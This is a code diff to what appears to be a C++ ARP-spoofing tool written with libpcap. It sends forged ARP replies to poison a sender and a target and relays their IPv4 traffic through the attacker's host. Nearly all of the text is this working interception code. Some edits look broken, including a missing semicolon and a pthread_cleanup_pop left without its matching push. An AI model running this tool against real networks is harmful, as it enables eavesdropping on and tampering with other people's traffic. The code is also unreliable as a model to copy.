@@ -43,17 +43,12 @@ pthread_t* threads;
 
 void usage()
 {
-	printf("usage");
+	printf("args count is something wrong....");
 	return;
 }
 
-void cleanup_handler(void* arg)
-{
-	//idk how to handle this
-	printf("stopping thread...\n");
-}
 
-void sigint_handler(int sig)
+void InterruptHandler(int sig)
 {
 	//preventing malloc cat
 	printf("SIGINT - stopping...\n");
@@ -76,12 +71,13 @@ void sigint_handler(int sig)
 	exit(0);
 }
 
-int get_my_ip(char* interface, char* ip)
+int GetIP(char* interface, char* ip)
 {
 	int fd;
 	struct ifreq ifr;
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
-	if (fd < 0) {
+	if (fd < 0) 
+	{
         perror("socket");
         return EXIT_FAILURE;
     }
@@ -119,13 +115,16 @@ int Target_resolve(pcap_t* handle, Edge* sender, Edge* attacker)
 		const u_char* recv_packet;
 		int res = pcap_next_ex(handle, &header, &recv_packet);
 		if (res == 0) continue;
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
+		{
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			return 1;
 		}
 		struct EthArpPacket *conv_packet = (struct EthArpPacket *)recv_packet;
-		if(conv_packet->arp_.op() == ArpHdr::Reply && conv_packet->eth_.type() == EthHdr::Arp){
-			if(conv_packet->arp_.sip() == sender -> ip && conv_packet->arp_.tmac() == attacker -> mac){
+		if(conv_packet->arp_.op() == ArpHdr::Reply && conv_packet->eth_.type() == EthHdr::Arp)
+		{
+			if(conv_packet->arp_.sip() == sender -> ip && conv_packet->arp_.tmac() == attacker -> mac)
+			{
 				sender -> mac = conv_packet -> arp_.smac();
 				printf("MAC resolved - %s to %s\n", std::string(sender -> ip).c_str(), std::string(sender -> mac).c_str());
 				return 0;
@@ -151,7 +150,10 @@ int Arp_attack(pcap_t* handle, Args* args)
 	send_packet.arp_.tip_ = htonl(args -> sender.ip);
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&send_packet), sizeof(EthArpPacket));
-	if (res != 0) {
+	
+	//error handling
+	if (res != 0) 
+	{
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		return 1;
 	}
@@ -167,14 +169,19 @@ int packet_relaying(pcap_t* handle, Args * args)
 	int res;
 	int ctr = 1;
 
-	while (1) {
+	while (1) 
+	{
 		res = pcap_next_ex(handle, &header, &recv_packet);
-		if (res == 0)
-			continue;
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+
+		// result check
+		if (res == 0) continue;
+
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
+		{
 				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 				return 1;
 		}
+
 		uint packet_size = header -> caplen;
 
 		struct EthArpPacket *conv_packet = (struct EthArpPacket *)recv_packet;
@@ -189,7 +196,7 @@ int packet_relaying(pcap_t* handle, Args * args)
 				if(conv_packet -> eth_.dmac().isBroadcast())
 				{
 					printf("Attacking again\n");
-					sleep(0.2);
+					sleep(0.5);
 					Arp_attack(handle, args);
 				}
 			}
@@ -199,21 +206,21 @@ int packet_relaying(pcap_t* handle, Args * args)
 			if(conv_packet->eth_.type() != EthHdr::Ip4)
 				continue;
 
-			if(conv_packet->eth_.smac() == flow -> sender.mac)
+			if(conv_packet->eth_.smac() == args -> sender.mac)
 			{
 				conv_packet->eth_.smac_ = conv_packet->eth_.dmac();
-				conv_packet->eth_.dmac_ = flow -> target.mac;
+				conv_packet->eth_.dmac_ = args -> target.mac;
 			}
 			else
 			{
 				continue;
 			}
 			
-			std::cout << "packet_relaying(" << ctr << ") : " << std::string(flow -> sender.mac) << " to " << std::string(conv_packet->eth_.dmac()) << std::endl;
+			std::cout << "packet_relaying(" << ctr << ") : " << std::string(args -> sender.mac) << " to " << std::string(conv_packet->eth_.dmac()) << std::endl;
 			ctr++;
 			if(packet_size > 1514)
 			{
-				std::cout << "packet is too big and beautiful1ll" << std::endl;
+				std::cout << "packet size is over than 1515" << std::endl;
 				continue;
 			}
 
@@ -221,7 +228,8 @@ int packet_relaying(pcap_t* handle, Args * args)
 			memcpy(relay_packet, conv_packet, 14);
 
 			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(relay_packet), packet_size);
-			if (res != 0) {
+			if (res != 0) 
+			{
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 				return 1;
 			}
@@ -236,7 +244,6 @@ void* threader(void* args)
 	Edge* sender = &(trans_arg -> sender)
 	Edge* target = &(trans_arg -> target);
 	Edge* attacker = &(trans_arg -> attacker);
-	pthread_cleanup_push(cleanup_handler, NULL);
 	if(Target_resolve(handle, sender, attacker) != 0 || Target_resolve(handle, target, attacker) != 0)
 	{
 		printf("Target_resolve fail\n");
@@ -249,7 +256,7 @@ void* threader(void* args)
 	}
 	if(packet_relaying(handle, trans_arg) != 0)
 	{
-		printf("packet_relaying fail\n");
+		printf("packet relaying fail\n");
 		pthread_exit((void*)1);
 	}
 	pthread_cleanup_pop(0);
@@ -265,27 +272,28 @@ int main(int argc, char* argv[])
 		return -1;
 	}
 	int pair_size = argc / 2 - 1;
+
 	arg_size = pair_size;
-	int err_no;
-	signal(SIGINT, sigint_handler);
+	
+	signal(SIGINT, InterruptHandler);
 	args = (Args*)malloc(pair_size * sizeof(Args));
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
 	char my_ip[16];
 	threads = (pthread_t*)malloc(pair_size * sizeof(pthread_t));
-	get_my_ip(dev, my_ip);
+	GetIP(dev, my_ip);
 	std::ifstream iface("/sys/class/net/" + std::string(dev) + "/address");
   	std::string my_mac((std::istreambuf_iterator<char>(iface)), std::istreambuf_iterator<char>());
 
-	printf("Myip : %s\n", my_ip);
-	printf("MyMac : %s\n", my_mac.c_str());
+	printf("My IP address : %s\n", my_ip);
+	printf("My MAC address : %s\n", my_mac.c_str());
 	for(int i = 0; i < pair_size; i++)
 	{
 		(args + i) -> attacker.ip = Ip(std::string(my_ip));
 		(args + i) -> attacker.mac = Mac(my_mac);
 		(args + i) -> handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-		(args + i) -> flow.sender.ip = Ip(argv[i * 2 + 2]);
-		(args + i) -> flow.target.ip = Ip(argv[i * 2 + 3]);
+		(args + i) -> sender.ip = Ip(argv[i * 2 + 2]);
+		(args + i) -> target.ip = Ip(argv[i * 2 + 3]);
 		if ((args + i) -> handle == nullptr) {
 			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 			return -1;
